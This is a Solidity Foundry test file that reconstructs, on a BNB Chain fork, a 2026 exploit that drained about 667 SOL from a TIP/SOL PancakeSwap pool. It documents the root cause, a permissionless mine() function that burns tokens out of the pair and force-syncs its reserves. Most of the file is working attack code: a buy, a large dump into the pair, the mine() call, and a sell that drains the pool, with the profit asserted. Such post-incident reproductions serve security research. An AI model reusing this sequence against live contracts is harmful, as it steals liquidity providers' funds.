// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// TIP / TIPMine - permissionless mine() drains the TIP/SOL pool via a burn-from-pool + forced sync.
// ~667 SOL drained on BNB Chain, 2026-10-17.
//
// Attack tx     : 0xa7b879b5d4252fa5b518db1f81be8a5cc670c5b978c7626fa287c0a1f37895a3 (block 128188934)
// Attacker EOA  : 0x96bB3276f74Fd736a8BC89DF5B934F5b7F3Ef6ce
// Attack contract (on-chain, created by the tx): 0xdaB0622E6bbbE2ac7E54f1269Fa87014f8dA5F04
// TIPMine (victim, verified)    : 0x412c7bd213D4feA88b582A8A0E5B80e2F2d10993
// TIP token (verified)          : 0x36D75b5A8c724B692FBA78aC2dd8cE933c0e1F4E
// SOL token (quote asset, verified; a BEP-20 that uses the ticker "SOL", 18 decimals)
//                               : 0x570A5D26f7765Ecb712C0924E4De545B89fD43dF
// TIP/SOL PancakeV2 pair        : 0xb1E0FB4129314F3AEDAeD1a4061B22c20b3F1219 (token0=TIP, token1=SOL)
// PancakeV2 router              : 0x10ED43C718714eb63d5aA57B78B54704E256024E
//
// ROOT CAUSE (confirmed against the verified TIPMine and TIP sources):
//   TIPMine.mine() is permissionless. Its only guards are a supply check and a once-per-day timer:
//       function mine() external nonReentrant {
//           require(initialTotalSupply > 0, "!supply");
//           require(block.timestamp >= lastMineTime + 1 days, "too early");
//           uint256 releaseAmount = (initialTotalSupply - totalMined) * 200 / 10000; // 2% of remaining
//           ...
//           tipToken.burnFromPool(burnAmount);          // burnRate starts at 80% of the release
//           tipToken.distributeFromPool(stakeCore, ...); // the rest is pushed out of the pool
//       }
//   There is no caller restriction - any address can call mine() once the day timer allows it. At the
//   parent block lastMineTime == 0, so the timer is already satisfied and the first caller runs it.
//
//   mine() then removes TIP directly from the live Pancake pair through the TIP token, which force-syncs
//   the pair on each operation:
//       function burnFromPool(uint256 amount) external onlyMining {
//           _transfer(pool, address(0xdead), amount);   // burns TIP straight out of the LP pair
//           _syncPool();                                 // pool.call(sync()) - reserves snap to balances
//       }
//       function distributeFromPool(address to, uint256 amount) external onlyMinter { ... _syncPool(); }
//   (onlyMining and onlyMinter both include miningContract, and TIPMine IS the miningContract, so both
//    calls succeed when driven by mine().)
//
//   Burning/pushing TIP out of the pair and then sync()ing does not conserve the x*y=k invariant: the
//   TIP reserve collapses while the SOL reserve is untouched, so one TIP is suddenly worth vastly more
//   SOL. An attacker who is holding TIP when mine() fires can then sell that TIP back into the pair and
//   walk away with almost the entire SOL side of the pool. The TIP token's own sell path burns 94% of
//   any TIP sent to the pool and sync()s again, so the corruption compounds.
//
//   Verified on fork (see the probe values reproduced below), not assumed:
//     - mine() with no privileged caller burns/pushes 2,000,000,000 TIP out of the pair in one call,
//       dropping the pair TIP reserve from 2,000,053,839 to 53,839 while SOL stays at 35,837;
//     - running the exact same buy/dump/sell sequence WITHOUT the mine() call turns the +706 SOL profit
//       into a ~31,563 SOL loss, so mine() is the load-bearing lever, not incidental;
//     - TIPMine and TIP are verified on BscScan, so the mechanism is read from source, not guessed.
//
// MECHANISM - fully permissionless. The attacker is a plain EOA with its own contract. Every step is
//   open: the Venus-fork borrow, the ecosystem-pool flash loans, the Pancake swaps, and the mine() call.
//   No owner / admin / keeper / role / signature / victim-key step appears anywhere in the path. mine()
//   itself has no access control.
//
// RECONSTRUCTION - fork one block before the attack (128188933) and run the real sequence with typed
//   calls to the real pair, the real TIP token and the real TIPMine. Nothing is replayed from the
//   attacker's calldata or bytecode:
//     buy TIP with 1 SOL -> dump 35,121 SOL into the pair -> call the permissionless mine() to burn the
//     pool TIP and sync -> sell the held TIP back for SOL.
//   On-chain the SOL working capital (~36k SOL) was raised across several real flash sources - a
//   Venus-fork SOL borrow (~14,404 SOL, collateralised by a 206,503 WBNB flash loan) plus ~21,664 SOL
//   flash-borrowed from 13 TIP-ecosystem pools, all repaid in the same tx. That scam-SOL token has no
//   liquidity outside this ecosystem, so there is no clean single flash source to borrow it from on the
//   fork; the principal is modelled with deal() and round-tripped through the pool, exactly as the
//   MOKE_exp.sol PoC (same chain, same month) models flash principal. The profit asserted is therefore
//   already net of the capital.
//
// RESULT - the permissionless mine() reprices the pool and the sell drains it. This PoC nets
//   706.253909658913182860 SOL (the pool's full ~715 SOL reserve, less the AMM residual). On-chain the
//   attacker netted 667.228863551156127021 SOL to the EOA (SOL Transfer, log index 182); the difference
//   is the real multi-source flash-sourcing cost (Venus borrow interest + the 13-pool flash premiums)
//   that fee-free deal() capital does not incur. The assert ties the reconstructed profit to that
//   on-chain figure with a tolerance that covers exactly that modelled-away cost.
//
// Run:
//   forge test --contracts src/test/2026-10/TIPMine_exp.sol --evm-version cancun -vvv
//   (cancun is required: TIPMine.mine()'s nonReentrant guard uses transient storage.)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 ts);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ITIPMine {
    function mine() external;
}

contract TIPMineExploit is Test {
    address internal constant SOL = 0x570A5D26f7765Ecb712C0924E4De545B89fD43dF;
    address internal constant TIP = 0x36D75b5A8c724B692FBA78aC2dd8cE933c0e1F4E;
    address internal constant PAIR = 0xb1E0FB4129314F3AEDAeD1a4061B22c20b3F1219;
    address internal constant MINE = 0x412c7bd213D4feA88b582A8A0E5B80e2F2d10993;
    IPancakeRouter internal constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // Working capital the attacker raised from real flash sources (Venus-fork SOL borrow + 13 ecosystem
    // pools). Modelled here with deal() and round-tripped through the pool; see the RECONSTRUCTION note.
    uint256 internal constant WORKING_SOL = 36_000 ether;

    // Net SOL the attacker took to the EOA on-chain (SOL Transfer, log index 182 of the attack tx).
    uint256 internal constant ONCHAIN_NET_SOL = 667.228863551156127021 ether;

    function setUp() public {
        vm.createSelectFork("https://bsc-mainnet.public.blastapi.io", 128188933);
    }

    function _solReserve() internal view returns (uint256) {
        (, uint112 r1,) = IPair(PAIR).getReserves();
        return uint256(r1);
    }

    function _tipReserve() internal view returns (uint256) {
        (uint112 r0,,) = IPair(PAIR).getReserves();
        return uint256(r0);
    }

    function testExploit() public {
        deal(SOL, address(this), WORKING_SOL);

        IERC20(SOL).approve(address(ROUTER), type(uint256).max);
        IERC20(TIP).approve(address(ROUTER), type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = SOL;
        buyPath[1] = TIP;
        address[] memory sellPath = new address[](2);
        sellPath[0] = TIP;
        sellPath[1] = SOL;

        emit log_named_decimal_uint("pool TIP before      ", _tipReserve(), 18);
        emit log_named_decimal_uint("pool SOL before      ", _solReserve(), 18);

        // 1) acquire a small TIP position by buying with 1 SOL
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(1 ether, 0, buyPath, address(this), block.timestamp);

        // 2) dump SOL into the pair to move most of its TIP onto our side
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(35_121 ether, 0, buyPath, address(this), block.timestamp);
        emit log_named_decimal_uint("pool TIP after dump  ", _tipReserve(), 18);

        // 3) call the permissionless mine(): burns/pushes TIP out of the pair and force-syncs it,
        //    collapsing the TIP reserve while SOL is untouched
        ITIPMine(MINE).mine();
        emit log_named_decimal_uint("pool TIP after mine  ", _tipReserve(), 18);
        emit log_named_decimal_uint("pool SOL after mine  ", _solReserve(), 18);

        // 4) sell the held TIP back into the repriced pair and drain the SOL side
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(TIP).balanceOf(address(this)), 0, sellPath, address(this), block.timestamp
        );

        uint256 finalSol = IERC20(SOL).balanceOf(address(this));
        require(finalSol > WORKING_SOL, "no profit");
        uint256 profit = finalSol - WORKING_SOL;

        emit log_named_decimal_uint("pool SOL end         ", _solReserve(), 18);
        emit log_named_decimal_uint("profit SOL           ", profit, 18);
        emit log_named_decimal_uint("on-chain net SOL     ", ONCHAIN_NET_SOL, 18);

        // The reconstructed profit is the pool's full SOL reserve (fee-free capital); the on-chain net was
        // that figure less the real flash-sourcing cost. Tie the two together within that cost.
        assertGe(profit, ONCHAIN_NET_SOL, "reconstruction must capture the on-chain drain");
        assertApproxEqAbs(profit, ONCHAIN_NET_SOL, 45 ether, "profit within modelled flash cost of on-chain net");
    }
}
